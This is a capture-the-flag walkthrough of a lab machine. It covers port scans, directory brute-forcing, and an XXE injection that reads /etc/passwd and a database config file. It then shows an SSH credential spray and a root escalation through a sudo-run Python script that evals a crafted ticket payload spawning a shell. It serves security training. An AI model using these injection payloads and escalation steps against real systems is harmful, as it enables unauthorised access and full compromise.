## understanding the structure

1. nmapping the server looking for open ports and hints: <code>sudo nmap -p- --min-rate 10000 -oA bountynmap/ports -v 10.10.11.100</code>
![nmap1 results](https://is-going-to-rick-roll.me/1637699944.png)


From the nmap result i can understand that ports <mark>80, and 22</mark> are open

Now I'll run a deeper nmap to check sevrer info and what's actually is open

<code>sudo nmap -sC -sV -oA bountynmap/etc -p 80,22 10.10.11.100</code>
![nmap2 results](https://is-going-to-rick-roll.me/1637699794.png)

<br>

## mapping the website - looking for vulnerabilities in UI 

After opening burp suite and checking all pages and forms i can see the they are not really doing any action.
Besides the portal page thats navigates to http://10.10.11.100/log_submit.php

![burp suite check](https://is-going-to-rick-roll.me/1637762423.png)

this form sends the data i input to the form and encodes in base64
decoding this string returns XML instructions.

try to change the date to XML with XXE

From looking at the pages I can also see that the website is coded in PHP, so I started to run `gobuster` (brute-force tool) on SecLists raft-small-words list.
<code>gobuster dir -w SecLists/Discovery/Web-Content/raft-small-words.txt -x php -o hunterPages.txt -u http://10.10.11.100</code>


![XXE found](https://is-going-to-rick-roll.me/1637762393.png)

<br>

## executing commands/drawing out data from the server

After we found the first vulnerability we can use it and try to draw data, let's try getting the passwd file usign using the XXE.

![XXE](https://is-going-to-rick-roll.me/1637762776.png)

and here we go, it returned all the registered users

save the result in new file and grpe all users:

<code>grep home passwdFile | cut -d: -f1</code>

![users](https://is-going-to-rick-roll.me/1637763224.png)
we have two users: `"syslog", and "development"`

<br>

Now when the brute-force process (using gobuster) has endeed we can take a look at the output (hunterPages.txt) and take a look on all the pages.
From a first look i can find a file that might contain some details "/db.php"

trying to navigate to http://10.10.11.100/db.php returns  200 without any data, so maybe we can try getting this page with XXE


![db file](https://is-going-to-rick-roll.me/1637765282.png)

now the td tag line returns a result including something that might be the db.php encrypted.
decoding it using base64 returns
```php
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "password-was-removed-do-it-yourself";
$testuser = "test";
?>
```

alright now when we have the password we can try and login to a user.
I used `crackmapexec` to try and login to one of the users.

create a file with all the users we found (development and syslog)
run: `crackmapexec ssh 10.10.11.100 -u users.lst -p "m19RoAU0hP41A1sTsq6K"`


##### crackmapexec result
![crackmapexec result](https://is-going-to-rick-roll.me/1637776835.png)

as we can see from the result, we have now the connection info to user: development followed by his password we found.

###### connect via SSH

<code>cat user.txt</code> - Congrats this is the first flag.



<br>

## Time to own the system

run: <code>sudo -l</code> to see what files the current user can run

![sudo -l -> response](https://is-going-to-rick-roll.me/1637778122.png)

The only intresting file is ticketValidator.py, this is also might me our hint.

After a short look i can see that this file is evaluating user input, so it might be vulnerable.

# Conclusions regarding the script [a relative link](/bountynmap/ticketValidator.py)

* File must to end with <mark>.md</mark>
* First line in the file must be <mark># Skytrain Inc</mark>
* Second line in the file must to start with <mark>## Ticket to &nbsp;</mark>
* Closed tickets 3rd line will be <mark>__Ticket Code:__</mark> you can also leave it like <mark>__Ticket Code:</mark>
  but line after must to start with <bold>**</bold> and it'll be replaced with ""
* After all these steps and if you pass all the checks It'll check if <code>if int(ticketCode) % 7 == 4:</code> is true
and It'll eval <code>eval(x.replace("**", ""))</code>


<h6>make sure to run this script with sudo</h6>
```s
# Skytrain Inc
## Ticket to 
__Ticket Code:__
**11+__import__("os").system("bash")
```

run: <code>whoami</code> -> congrats you are root!

```s
cd ~
```

```s
cat root.txt
```